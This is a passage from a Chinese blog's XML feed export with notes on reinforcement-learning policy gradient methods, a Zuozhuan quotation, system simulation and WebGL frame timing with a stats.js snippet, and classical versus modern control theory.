<li><a href="https://www.hjenglish.com/yufadaquan/p981297/" target="_blank" rel="noopener">过去分词在句子中做状语的用法总结</a>,by 古月月.</li>
<li><a href="https://www.hjenglish.com/yufadaquan/p981296/" target="_blank" rel="noopener">现在分词在句子中作状语的用法</a>,by 古月月.</li>
<li><a href="http://yufa.fltacn.com/zh-cn/88/bb.html" target="_blank" rel="noopener">副词修饰动词时在英语句子中不同的位置</a>,by yufa.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%AE%9A%E8%AA%9E" target="_blank" rel="noopener">定语</a>,by wikipedia.</li>
<li><a href="https://vanoneang.github.io/english/" target="_blank" rel="noopener">English learning</a>,by 一飞同学.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E8%A1%A8%E8%AA%9E" target="_blank" rel="noopener">表语</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title>策略梯度方法笔记</title>
    <url>/2020/02/10/%E7%AD%96%E7%95%A5%E6%A2%AF%E5%BA%A6%E6%96%B9%E6%B3%95%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>使用强化学习实现机器人的连续控制，策略梯度方法是首选。下面即对强化学习中策略梯度方法进行总结。</p>
<h1 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h1><h2 id="免模型学习（Model-Free）-vs-有模型学习（Model-Based）"><a href="#免模型学习（Model-Free）-vs-有模型学习（Model-Based）" class="headerlink" title="免模型学习（Model-Free） vs 有模型学习（Model-Based）"></a>免模型学习（Model-Free） vs 有模型学习（Model-Based）</h2><p>不同强化学习算法最重要的区分点之一就是<strong>智能体是否能完整了解或学习到所在环境的模型。</strong> 环境的模型是指一个预测状态转换和奖励的函数。</p>
<p>有模型学习最大的优势在于智能体能够 提前考虑来进行规划，走到每一步的时候，都提前尝试未来可能的选择，然后明确地从这些候选项中进行选择。智能体可以把预先规划的结果提取为学习策略。这其中最著名的例子就是 AlphaZero。这个方法起作用的时候，可以大幅度提升采样效率 —— 相对于那些没有模型的方法。</p>
<p>有模型学习最大的缺点就是智能体往往不能获得环境的真实模型。如果智能体想在一个场景下使用模型，那它必须完全从经验中学习，这会带来很多挑战。最大的挑战就是，智能体探索出来的模型和真实模型之间存在误差，而这种误差会导致智能体在学习到的模型中表现很好，但在真实的环境中表现得不好（甚至很差）。基于模型的学习从根本上讲是非常困难的，即使你愿意花费大量的时间和计算力，最终的结果也可能达不到预期的效果。</p>
<p>使用模型的算法叫做有模型学习，不基于模型的叫做免模型学习。虽然免模型学习放弃了有模型学习在样本效率方面的潜在收益，但是他们往往更加易于实现和调整。</p>
<h2 id="同策略（on-policy）-vs-异策略（off-policy）"><a href="#同策略（on-policy）-vs-异策略（off-policy）" class="headerlink" title="同策略（on-policy） vs 异策略（off-policy）"></a>同策略（on-policy） vs 异策略（off-policy）</h2><p>异策略（off-policy）的代表算法Q-learning，亦称SarasMax，其采样的策略（用于执行，behavior policy) 和更新Q值的策略（用于评估，target policy）不一样，行为策略为贪心策略，而target policy为确定性策略，即选择最Q值最优的action。</p>
<p>同策略（on-policy）的代表算法Sarsa，亦称on-line Q-learning，其采样的策略（用于执行，behavior policy) 和更新Q值的策略（用于评估，target policy）一样,行为策略和目标策略均为贪心策略。Sarsa的每次Q值更新需要知道前一步的状态（state）、前一步的动作（action）、奖赏值（reward）、当前状态（state）、将要执行的动作（action），由此得名Sarsa算法。</p>
<h2 id="在线（online）-vs-离线（offline）"><a href="#在线（online）-vs-离线（offline）" class="headerlink" title="在线（online） vs 离线（offline）"></a>在线（online） vs 离线（offline）</h2><p>在计算机科学中，在线机器学习是一种机器学习的方法，其中数据按顺序可用，并且用于在每个步骤中为将来的数据更新我们的最佳预测器，而不是通过学习生成最佳预测器的批处理学习技术 一次对整个训练数据集。 在线学习是机器学习领域中的一种常用技术，在该领域中，计算无法训练整个数据集是不可行的，因此需要核心算法。 它也用于算法必须动态适应数据中的新模式的情况下，或者在数据本身随时间而变的情况下（例如，股价预测）使用。 在线学习算法可能易于遭受灾难性干扰，这一问题可以通过增量学习方法来解决。</p>
<p>在机器学习中，采用离线学习的系统在初始训练阶段完成后不会改变其对目标函数的近似值。这些系统通常也是渴望学习的示例。</p>
<p>在在线学习中，只有一组可能的元素是已知的，而在离线学习中，学习者则知道这些元素的标识以及它们显示的顺序。</p>
<h1 id="强化学习分类"><a href="#强化学习分类" class="headerlink" title="强化学习分类"></a>强化学习分类</h1><p align="center">
    <img src="images/rl_algorithms.svg" width="90%" alt="强化学习简单分类"/>
</p>
<center>图1 强化学习简单分类</center>

<p>在机器人学习领域，目前主要有三类有效的免模型的深度强化学习算法：</p>
<ul>
<li>TRPO,PPO</li>
<li>DDPG及其拓展（D4PG,TD3等）</li>
<li>Soft Q-Learning, Soft Actor-Critic</li>
</ul>
<p>PPO算法是TRPO（Trust Region Policy Optimization）算法的近似，该算法更能适应大规模的运算，是目前最主流的DRL算法，同时面向离散控制和连续控制，在OpenAI Five上取得了巨大成功。但是PPO是一种on-policy的算法，也就是PPO面临着严重的sample inefficiency，需要巨量的采样才能学习，这对于真实的机器人训练来说，是无法接受的。</p>
<p>DDPG及其拓展则是DeepMind开发的面向连续控制的off policy算法，相对PPO 更sample efficient。DDPG训练的是一种确定性策略deterministic policy，即每一个state下都只考虑最优的一个动作。</p>
<p>Soft Actor-Critic (SAC)是面向Maximum Entropy Reinforcement learning 开发的一种off policy算法，和DDPG相比，Soft Actor-Critic使用的是随机策略stochastic policy，相比确定性策略具有一定的优势（具体后面分析）。Soft Actor-Critic在公开的benchmark中取得了非常好的效果，并且能直接应用到真实机器人上。</p>
<h1 id="符号定义"><a href="#符号定义" class="headerlink" title="符号定义"></a>符号定义</h1><p>下表给出强化学习常用符号定义。</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>$s \in \mathcal{S}$</td>
<td>状态。</td>
</tr>
<tr>
<td>$a \in \mathcal{A}$</td>
<td>动作。</td>
</tr>
<tr>
<td>$r \in \mathcal{R}$</td>
<td>回报。</td>
</tr>
<tr>
<td>$S_{t}, A_{t}, R_{t}$</td>
<td>一个轨迹中第t个时间步对应的状态、动作以及回报。我可能会偶尔使用$s_t,a_t,r_t$来代替。</td>
</tr>
<tr>
<td>$\gamma$</td>
<td>折扣因子；用于惩罚未来回报中的不确定性；$0&lt;γ≤1$。</td>
</tr>
<tr>
<td>$G_{t}$</td>
<td>累积回报；或者说累积折扣回报；$G_{t}=\sum_{k=0}^{\infty} \gamma^{k} R_{t+k+1}$。</td>
</tr>
<tr>
<td>$P\left(s^{\prime}, r\vert s, a\right)$</td>
<td>在当前状态s下采取动作a后转移到下一个状态 s′ 并得到回报 r 的概率。</td>
</tr>
<tr>
<td>$\pi(a\vert s)$</td>
<td>随机策略（智能体行为逻辑）；$\pi_{\theta}( .)$代表由θ参数化的策略。</td>
</tr>
<tr>
<td>$μ(s)$</td>
<td>确定性策略；虽然也可以把确定性策略记为$π(s)$，但是采用一个不同的字母可以让我们更容易分辨一个策略到底是确定性的还是随机的。π或者μ都是强化学习算法要学习的目标。</td>
</tr>
<tr>
<td>$V(s)$</td>
<td>状态-值函数衡量状态s的期望累积回报；$V_{w}( .)$代表由w参数化的状态-值函数。</td>
</tr>
<tr>
<td>$V^{\pi}(s)$</td>
<td>当智能体遵循策略π时状态s的期望累积回报；$V^{\pi}(s)=\mathbb{E}<em>{a \sim \pi}\left[G</em>{t}\vert S_{t}=s\right]$</td>
</tr>
<tr>
<td>$Q(s,a)$</td>
<td>动作-值函数，与状态-值函数类似，但是它衡量在状态s下采取动作a后的期望累积回报；$Q_{w}( .)$代表由w参数化的动作-值函数。</td>
</tr>
<tr>
<td>$Q^{\pi}(s, a)$</td>
<td>与$V^{\pi}(s)$类似，当智能体遵循策略π时，在状态s下采取动作a后的期望累积回报；$Q^{\pi}(s, a)=\mathbb{E}<em>{a \sim \pi}\left[G</em>{t}\vert S_{t}=s,A_{t}=a\right]$</td>
</tr>
<tr>
<td>$A(s, a)$</td>
<td>优势函数，$A(s,a)=Q(s,a)−V(s)$；可以认为优势函数是加强版本的动作-值函数，但是由于它采用状态-值函数作为基准使得它具有更小的方差。</td>
</tr>
</tbody></table>
<h1 id="策略梯度方法"><a href="#策略梯度方法" class="headerlink" title="策略梯度方法"></a>策略梯度方法</h1><p>强化学习的目标是为智能体找到一个最优的行为策略从而获取最大的回报。策略梯度方法主要特点在于直接对策略进行建模并优化。策略通常被建模为由θ参数化的函数$\pi_{\theta}(a | s)$。回报（目标）函数的值受到该策略的直接影响，因而可以采用很多算法来对θ进行优化来最大化回报（目标）函数。</p>
<p>回报（目标）函数定义如下：<br>$$ J(\theta)=E_{\tau \sim \pi_{\theta}} [R(\tau)]=\sum_{s \in \mathcal{S}} d^{\pi}(s) V^{\pi}(s)=\sum_{s \in \mathcal{S}} d^{\pi}(s) \sum_{a \in \mathcal{A}} \pi_{\theta}(a | s) Q^{\pi}(s, a) $$</p>
<p>其中$d^{\pi}(s)$代表由$\pi_{\theta}$引出的马尔科夫链的平稳分布（π下的在线策略状态分布）。</p>
<p>使用梯度上升方法，我们可以将参数 $\theta$ 往梯度 $\nabla_{\theta} J(\theta)$ 给出的方向进行改变从而去找到最优的 $\theta$ 使得其对应的策略 $\pi_{\theta}$ 能够给智能体带来最大的期望累积回报。</p>
<p>$$\theta_{k+1} = \theta_k + \alpha \left. \nabla_{\theta} J(\pi_{\theta}) \right|_{\theta_k}.$$</p>
<p>策略性能的梯度 $\nabla_{\theta} J(\pi_{\theta})$ ，通常被称为 策略梯度 ，优化策略的算法通常被称为 策略算法 。</p>
<h2 id="策略梯度定理"><a href="#策略梯度定理" class="headerlink" title="策略梯度定理"></a>策略梯度定理</h2><p>$$\begin{aligned} \nabla_\theta J(\theta) &amp;\propto \sum_{s \in \mathcal{S}} d^\pi(s) \sum_{a \in \mathcal{A}} Q^\pi(s, a) \nabla_\theta \pi_\theta(a \vert s) &amp;\ &amp;= \sum_{s \in \mathcal{S}} d^\pi(s) \sum_{a \in \mathcal{A}} \pi_\theta(a \vert s) Q^\pi(s, a) \frac{\nabla_\theta \pi_\theta(a \vert s)}{\pi_\theta(a \vert s)} &amp;\ &amp;= \mathbb{E}_\pi [Q^\pi(s, a) \nabla_\theta \ln \pi_\theta(a \vert s)] &amp; \scriptstyle{\text{; 因为 } (\ln x)’ = 1/x} \end{aligned}$$</p>
<p>$\mathbb{E}<em>{\pi}$代表$\mathbb{E}</em>{s \sim d_{\pi}, a \sim \pi_{\theta}}$，下标表示遵循策略$\pi_{\theta}$（在线策略）时状态以及动作的分布。</p>
<h2 id="深度确定性策略梯度-（DDPG）"><a href="#深度确定性策略梯度-（DDPG）" class="headerlink" title="深度确定性策略梯度 （DDPG）"></a>深度确定性策略梯度 （DDPG）</h2><p>DDPG（Lillicrap, et al., 2015）是深度确定性策略梯度（Deep Deterministic Policy Gradient）的缩写，是一个结合了DPG以及DQN的无模型离线演员-评论家算法。DQN（深度Q网络）通过经验回访以及冻结目标网络的方式来稳定Q函数的训练过程。原始的DQN算法只能在离散的动作空间上使用，DDPG算法在学习一个确定性策略的同时通过演员-评论家框架将其扩展到连续的动作空间中。</p>
<p align="center">
    <img src="images/ddpg.svg" width="90%" alt="深度确定性策略梯度算法伪代码"/>
</p>
<center>图2 深度确定性策略梯度算法伪代码</center>

<h1 id="近似策略优化PPO"><a href="#近似策略优化PPO" class="headerlink" title="近似策略优化PPO"></a>近似策略优化PPO</h1><h1 id="DQN"><a href="#DQN" class="headerlink" title="DQN"></a>DQN</h1><h1 id="SAC"><a href="#SAC" class="headerlink" title="SAC"></a>SAC</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://tomaxent.com/2019/04/14/%E7%AD%96%E7%95%A5%E6%A2%AF%E5%BA%A6%E6%96%B9%E6%B3%95/" target="_blank" rel="noopener">策略梯度方法</a>,by Abracadabra.</li>
<li><a href="https://lilianweng.github.io/lil-log/2018/02/19/a-long-peek-into-reinforcement-learning.html#key-concepts" target="_blank" rel="noopener">A (Long) Peek into Reinforcement Learning</a>,by Lilian Weng.</li>
<li><a href="https://spinningup.readthedocs.io/zh_CN/latest/spinningup/rl_intro3.html" target="_blank" rel="noopener">第三部分：策略优化介绍</a>,by spinningup.</li>
<li><a href="https://huangwang.github.io/2018/11/26/%E6%B7%B1%E5%BA%A6%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6%E7%AC%94%E8%AE%B0/">深度强化学习研究笔记</a>,by jackhuang.</li>
<li><a href="https://zhuanlan.zhihu.com/p/81437177" target="_blank" rel="noopener">异策略（Q-learning） v.s. 同策略（Sarsa）</a>,by MOMO.</li>
<li><a href="https://en.wikipedia.org/wiki/Online_machine_learning" target="_blank" rel="noopener">Online_machine_learning</a>,by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/70360272" target="_blank" rel="noopener">最前沿：深度解读Soft Actor-Critic 算法</a>,by Flood Sung.</li>
<li><a href="https://zhuanlan.zhihu.com/p/41217212" target="_blank" rel="noopener">重要性采样（Importance Sampling）</a>,by 时雨.</li>
<li><a href="https://zhuanlan.zhihu.com/p/60257706" target="_blank" rel="noopener">TRPO论文推导</a>,by Ja1r0.</li>
<li><a href="https://zhuanlan.zhihu.com/p/26308073" target="_blank" rel="noopener">强化学习进阶 第七讲 TRPO</a>,by 天津包子馅儿.</li>
<li><a href="https://blog.csdn.net/weixin_41679411/article/details/82421121" target="_blank" rel="noopener">强化学习–信赖域系方法：TRPO、PPO</a>,by 秋曾万.</li>
<li><a href="http://morningxb.cn/2018/06/16/%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0-8-%E2%80%94%E2%80%94DQN/" target="_blank" rel="noopener">强化学习(8)——DQN</a>,by 自由而无用.</li>
<li><a href="https://zhuanlan.zhihu.com/p/93629846" target="_blank" rel="noopener">理解策略梯度算法</a>,by SIGAI.</li>
<li><a href="https://zhuanlan.zhihu.com/p/114236301" target="_blank" rel="noopener">SAC论文解读以及简易代码复现</a>,by 已注销.</li>
<li><a href="https://blog.csdn.net/qq_30615903/article/details/86308045" target="_blank" rel="noopener">PPO(Proximal Policy Optimization)近端策略优化算法</a>,by shura_R.</li>
<li><a href="https://lilianweng.github.io/lil-log/2018/04/08/policy-gradient-algorithms.html" target="_blank" rel="noopener">Policy Gradient Algorithms</a>,by lilianweng.</li>
<li><a href="https://zhuanlan.zhihu.com/p/60257706" target="_blank" rel="noopener">TRPO论文推导</a>,by Ja1r0.</li>
<li><a href="https://anesck.github.io/M-D-R_learning_notes/RLTPI/notes_html/9.chapter_nine.html" target="_blank" rel="noopener">第九章：连续动作空间的确定性策略</a>,by anesck.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>立功立德立言</title>
    <url>/2018/05/08/%E7%AB%8B%E5%8A%9F%E7%AB%8B%E5%BE%B7%E7%AB%8B%E8%A8%80/</url>
    <content><![CDATA[<p>来源：《左传》<br>二十四年春，穆叔如晋。范宣子逆之，问焉，曰：“古人有言曰：‘死而不朽’，何谓也？”穆叔未对。宣子曰：“昔匄之祖，自虞以上为陶唐氏，在夏为御龙氏，在商为豕韦氏，在周为唐杜氏，晋主夏盟为范氏，其是之谓乎？”穆叔曰：“以豹所闻，此之谓世禄，非不朽也。鲁有先大夫曰臧文仲，既没，其言立，其是之谓乎！豹闻之，‘太上有立德，其次有立功，其次有立言’，虽久不废，此之谓不朽。若夫保姓受氏，以守宗祊，世不绝祀，无国无之，禄之大者，不可谓不朽。</p>
]]></content>
      <tags>
        <tag>传统文化</tag>
        <tag>国学</tag>
      </tags>
  </entry>
  <entry>
    <title>系统仿真中一些问题的思考</title>
    <url>/2018/12/18/%E7%B3%BB%E7%BB%9F%E4%BB%BF%E7%9C%9F%E4%B8%AD%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<p>系统仿真（system simulation）就是根据系统分析的目的，在分析系统各要素性质及其相互关系的基础上，建立能描述系统结构或行为过程的、且具有一定逻辑关系或数量关系的仿真模型，据此进行试验或定量分析，以获得正确决策所需的各种信息。</p>
<h1 id="系统仿真与仿真游戏的区别"><a href="#系统仿真与仿真游戏的区别" class="headerlink" title="系统仿真与仿真游戏的区别"></a>系统仿真与仿真游戏的区别</h1><p>系统仿真与仿真游戏本质上没有区别，都是计算机程序对现实的模拟，所不同的是各自对仿真保真度（Simulation Fidelity）的要求不同。</p>
<p>仿真保真度（Simulation Fidelity）用于描述仿真精度，模拟真实对应物有多近似：</p>
<ul>
<li>低保真：对系统的最小模拟，接受输入产生输出</li>
<li>中等保真：对刺激能自动响应，有限精度</li>
<li>高保真：接近不可辨识或者尽可能地接近真实系统</li>
</ul>
<p>通常系统仿真对仿真保真度的要求比仿真游戏要高。</p>
<h1 id="计算步长与采样周期"><a href="#计算步长与采样周期" class="headerlink" title="计算步长与采样周期"></a>计算步长与采样周期</h1><p>采用计算机进行数值模拟或系统仿真时，经常需要采用数值解法求解模型方程。系统模型一般采用微分方程描述（也有其它形式），采用数值方法求解，就是采用迭代法逐步逼近。</p>
<h2 id="计算步长"><a href="#计算步长" class="headerlink" title="计算步长"></a>计算步长</h2><p>积分与微分是互逆。对一个曲线（包括直线）方程求积分，其实就是求曲线与横轴围成的面积。该面积可以用一系列间隔很小的面积块相加得到。这些小间隔的宽度就是计算步长。显然，纯粹从精度的角度考虑，步长越小越精确，因为近似面积更接近实际图形面积。</p>
<h2 id="采样周期"><a href="#采样周期" class="headerlink" title="采样周期"></a>采样周期</h2><p>采样周期是对一个实际信号测量时，相邻两次测量之间的时间间隔。有时候，采样周期和计算步长相似，但采样周期要考虑实际限制，且是时间单位，而计算步长不一定是时间单位，且相对自由些。两者在数值上没必然联系。<strong>对于同一问题，且都是时间量纲的话，采样周期大于等于计算步长，前者是后者的整数倍</strong>。</p>
<p>系统仿真包含系统模型求解，也就是在每个采样周期内，要解出模型方程。控制系统仿真时在采样周期内要解出两个模型方程：控制器模型和系统模型。</p>
<p><strong>一个采样周期内可对系统模型迭代求解一次或多次</strong>。</p>
<h2 id="计算步长和采样周期大小的选择"><a href="#计算步长和采样周期大小的选择" class="headerlink" title="计算步长和采样周期大小的选择"></a>计算步长和采样周期大小的选择</h2><p>关于采样周期和计算步长的选择，一般考虑以下因素：</p>
<ul>
<li><p>从求解精度考虑，越小越好。</p>
</li>
<li><p>从计算量考虑，越大越好。</p>
</li>
</ul>
<h2 id="采样周期与每秒帧数-Frames-Per-Second，FPS"><a href="#采样周期与每秒帧数-Frames-Per-Second，FPS" class="headerlink" title="采样周期与每秒帧数(Frames Per Second，FPS)"></a>采样周期与每秒帧数(Frames Per Second，FPS)</h2><p>采样周期以秒为单位，则</p>
<p>$$FPS=\frac{1}{采样周期}$$</p>
<p>FPS是指每秒画面重绘的次数，用于衡量画面切换速度。FPS越大，则动画效果越平滑，当FPS小于20时，一般就能明显感受到画面的卡滞现象。</p>
<p>当FPS足够大(比如达到60)，再增加帧数人眼也不会感受到明显的变化，反而相应地就要消耗更多资源(比如电影的胶片就需要更长了，或是电脑刷新画面需要消耗计算资源等等)。因此，选择一个适中的FPS即可。</p>
<p>NTSC标准的电视FPS是30，PAL标准的电视FPS是25，电影的FPS标准为24。</p>
<h1 id="WebGL动画"><a href="#WebGL动画" class="headerlink" title="WebGL动画"></a>WebGL动画</h1><p>WebGL是一种JavaScript API，用于在不使用插件的情况下在任何兼容的网页浏览器中呈现交互式2D和3D图形。但要产生WebGL动画，需要对运动的场景不停的采样，即不停地拍照。JavaScript的采样函数主要有setInterval方法和requestAnimationFrame方法。</p>
<h2 id="setInterval方法"><a href="#setInterval方法" class="headerlink" title="setInterval方法"></a>setInterval方法</h2><blockquote>
<p>如果要设置特定的FPS(虽然严格来说，即使使用这种方法，JavaScript也不能保证帧数精确性)，可以使用JavaScript DOM定义的方法：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setInterval(fn,mesc)</span><br></pre></td></tr></table></figure>

<p>其中，fn是每过msec毫秒执行的函数，如果将fn定义为重绘画面的函数，就能实现动画效果。setInterval函数返回一个变量timer，如果需要停止重绘，需要使用clearInterval方法，并传入该变量timer。</p>
<h2 id="requestAnimationFrame方法"><a href="#requestAnimationFrame方法" class="headerlink" title="requestAnimationFrame方法"></a>requestAnimationFrame方法</h2><blockquote>
<p>大多数时候，我们并不在意多久重绘一次，这时候就适合用requestAnimationFrame方法了。它告诉浏览器在合适的时候调用指定函数，通常可能达到60FPS。</p>
</blockquote>
<ul>
<li>requestAnimationFrame同样有对应的cancelAnimationFrame取消动画</li>
<li>和setInterval不同的是，由于requestAnimationFrame只请求一帧画面，因此，除了在init函数中需要调用，在被其调用的函数中需要再次调用requestAnimationFrame</li>
</ul>
<h2 id="使用stat-js记录FPS"><a href="#使用stat-js记录FPS" class="headerlink" title="使用stat.js记录FPS"></a>使用stat.js记录FPS</h2><p>stat.js是Three.js的作者Mr.Doob的另一个有用的JavaScript库。很多情况下，我们希望知道实时的FPS信息，从而更好地监测动画效果。这时候，stat.js就能提供一个很好的帮助，它占据屏幕中的一小块位置(如左上角)，显示实时的FPS信息。</p>
<p>在HTML中引用stat.js:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;&#x2F;&#x2F;mrdoob.github.io&#x2F;stats.js&#x2F;build&#x2F;stats.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>再使用如下代码监视实时FPS：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var stats &#x3D; new Stats();</span><br><span class="line">stats.showPanel( 1 ); &#x2F;&#x2F; 0: fps, 1: ms, 2: mb, 3+: custom</span><br><span class="line">document.body.appendChild( stats.dom );</span><br><span class="line"></span><br><span class="line">function animate() &#123;</span><br><span class="line"></span><br><span class="line">	stats.begin();</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; monitored code goes here</span><br><span class="line"></span><br><span class="line">	stats.end();</span><br><span class="line"></span><br><span class="line">	requestAnimationFrame( animate );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requestAnimationFrame( animate );</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://blog.sciencenet.cn/blog-341979-776318.html" target="_blank" rel="noopener">计算步长和采样周期</a>,by 王永林.</li>
<li><a href="http://www.ufgame.com/5951.html" target="_blank" rel="noopener">离散和连续模拟之间的实际区别是什么？</a>,by UF Game.</li>
<li><a href="https://baike.baidu.com/item/系统仿真" target="_blank" rel="noopener">系统仿真</a>,by 百度百科.</li>
<li><a href="https://www.ibm.com/developerworks/cn/opensource/os-physicsengines/index.html" target="_blank" rel="noopener">开源的物理引擎</a>,by M. Jones.</li>
<li><a href="https://zh.wikipedia.org/wiki/数值分析" target="_blank" rel="noopener">数值分析</a>,by wikipedia.</li>
<li><a href="https://segmentfault.com/a/1190000012238927" target="_blank" rel="noopener">three.js 入门详解(二)</a>,by Levi.</li>
<li><a href="https://zh.wikipedia.org/wiki/WebGL" target="_blank" rel="noopener">WebGL</a>,by wikipedia.</li>
<li><a href="https://github.com/mrdoob/stats.js" target="_blank" rel="noopener">stats.js</a>, by mydoob.</li>
<li><a href="https://zhuanlan.zhihu.com/p/33058983" target="_blank" rel="noopener">详解JavaScript中的Event Loop（事件循环）机制</a>,by 暮雨清秋.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
        <tag>WebGL</tag>
      </tags>
  </entry>
  <entry>
    <title>经典控制与现代控制理论的区别与联系</title>
    <url>/2019/06/09/%E7%BB%8F%E5%85%B8%E6%8E%A7%E5%88%B6%E4%B8%8E%E7%8E%B0%E4%BB%A3%E6%8E%A7%E5%88%B6%E7%90%86%E8%AE%BA%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/</url>
    <content><![CDATA[<p>控制理论是工程学与数学的跨领域分支，主要处理在有输入信号的动力系统的行为。系统的外部输入称为“参考值”，系统中的一个或多个变量需随着参考值变化，控制器处理系统的输入，使系统输出得到预期的效果。</p>
<p>控制理论一般的目的是借由控制器的动作让系统稳定，也就是系统维持在设定值，而且不会在设定值附近晃动。</p>
<h1 id="控制论简介"><a href="#控制论简介" class="headerlink" title="控制论简介"></a>控制论简介</h1><p>控制理论是</p>
<ul>
<li>一个研究如何调整动态系统特性的理论。</li>
<li>科学中跨学科的领域，起源于工程及数学，逐渐的应用在许多社会科学中，例如心理学、社会学（社会学中的控制理论）、犯罪学及金融系统。</li>
</ul>
<p>控制系统可以视为具有四种机能的系统：<strong>量测、比较、计算及修正</strong>。这四个机能可以用五种元素来实现：<strong>感测器、换能器、发送器、控制器及最终控制元件</strong>。量测机能是由感测器、换能器及发送器执行，在实务应用上，这三个元素会整合在一个单体内，像是电阻温度计。比较和计算的机能是由控制器执行，可能是电子式的比例控制（P控制）、PI控制、PID控制、双稳态的迟滞控制，也可能是可编程逻辑控制器（PLC）。早期的控制器也可能是机械式的，像是离心式调速器或是化油器。修正机能是由最终控制元件执行，最终控制元件改变系统的输出，因此影响操纵或控制的变量。</p>
<h2 id="范例"><a href="#范例" class="headerlink" title="范例"></a>范例</h2><p>车辆的巡航定速系统是让车辆维持在由驾驶者设定的固定参考速度。此时控制器为巡航定速系统，车辆为受控体（plant），而系统是由控制器和车辆所组成，而控制变量是引擎节流阀的位置．会决定引擎可以产生的功率。</p>
<p>一种最单纯的作法是当驾驶者启动巡航定速系统时，固定引擎节流阀的位置。但是若驾驶者在平坦的路面启动巡航定速系统，车辆在上坡时速度会较慢，车辆在下坡时速度又会较快。这种的控制器称为开环控制器，因为没有去量测系统输出（车辆速度）并且影响控制变量（节流阀位置），因此此系统无法去针对车辆遇到的变化（像路面坡度的变动）去进行调整。</p>
<p>在闭环控制系统中，利用感测器量测系统输出（车辆速度），并将资料送入控制器中，控制器依资料调整控制变量（节流阀位置），来达到维持理想系统输出（使车辆速度和驾驶者设定的参考速度一致）。此时若车辆在上坡时，感测器会量到车辆的速度变慢，因此会调整节流阀位置，加大引擎输出功率，使马达加速。因为有量测车辆速度的回授，因此控制器可以配合车辆速度的变化进行动态调整。因此产生了控制系统中的“环”范式：控制变量影响系统输出，而再根据量测到的系统输出去调整控制变量。</p>
<h1 id="经典控制理论"><a href="#经典控制理论" class="headerlink" title="经典控制理论"></a>经典控制理论</h1><p>为了克服开环控制器的限制，在控制理论中导入了反馈。闭环的控制器利用回授来控制动态系统的状态或输出。其名称来自系统中的讯息路径：程序输入（例如马达的电压）影响程序输出（例如马达的电流或转矩），利用感测器量测输出，再将量测资料送到控制器中处理，结果送回控制器作为输入信号之一，因此成为一闭环。</p>
<p>相对于开环控制器，闭环控制器有以下的优点：</p>
<ul>
<li>噪声抑制能力（像巡航定速中的路面坡度）。</li>
<li>即使在数学模型有一些不确定性的情形下（如模型结构和实际系统不是完全符合，或是模型参数和实际数值不是完全一致），仍有一定程度的性能。</li>
<li>可以稳定不稳定的系统</li>
<li>减少对于参数变动的灵敏度</li>
<li>提升命令追随（命令变化时，系统配合命令变化）的性能</li>
<li>有些系统中，同时出现开环及闭环的控制，此时的开环会称为前馈，目的是为了提升命令追随的性能。</li>
</ul>
<p>PID控制器是常见的闭回路控制器架构。</p>
<h2 id="闭环传递函数"><a href="#闭环传递函数" class="headerlink" title="闭环传递函数"></a>闭环传递函数</h2><p>系统的输出y(t)借由感测器F量测后，和参考值r(t)相减，控制器C根据参考值和输出值的误差e调整受控体P的输入u，如图1所示，这类的控制器称为闭环控制器。</p>
<p>由于只有一个输入和输出，此系统会称为SISO（单一输入单一输出）控制系统。MIMO（多重输入多重输出）控制系统是指输入或输出不只一个，在实际应用上也很常见，其输入变量和输出变量会用向量表示，而不是单一数值的标量。在分布参量系统中，向量可能是无限维的，即一般的函数。</p>
<p align="center">
    <img src="images/control_loop.png" width="50%" alt="闭环传递函数示意图"/>
</p>
<center>图1  闭环传递函数示意图</center>

<p>若假设控制器C、受控体P及感测器F都是线性及非时变的（各模组输入和输出的关系不随时间改变），可以将上述系统用拉普拉斯转换来分析，因此可以得到以下的关系：</p>
<p>$$Y(s)=P(s)U(s),!$$<br>$$U(s)=C(s)E(s),!$$<br>$$E(s)=R(s)-F(s)Y(s),!$$</p>
<p>其中 s为拉普拉斯转换中的复变量，若要求解Y(s)用R(s)表示，可得：</p>
<p>$$Y(s)=\left({\frac  {P(s)C(s)}{1+F(s)P(s)C(s)}}\right)R(s)=H(s)R(s),!$$</p>
<p>表示式 $H(s)={\frac {P(s)C(s)}{1+F(s)P(s)C(s)}},!$即为系统的闭环传递函数，分子是从r到y的前馈（开环）增益，分母是1加上经过反馈环的增益．即闭环增益，若$|P(s)C(s)|\gg 1,!$，，也就是说在各s下，其范数都很大，且 $|F(s)|\approx 1,!$，则Y(s)近似于R(s)，此时输出会紧密的追随参考输入。</p>
<h2 id="PID"><a href="#PID" class="headerlink" title="PID"></a>PID</h2><p>请参考链接[4]。</p>
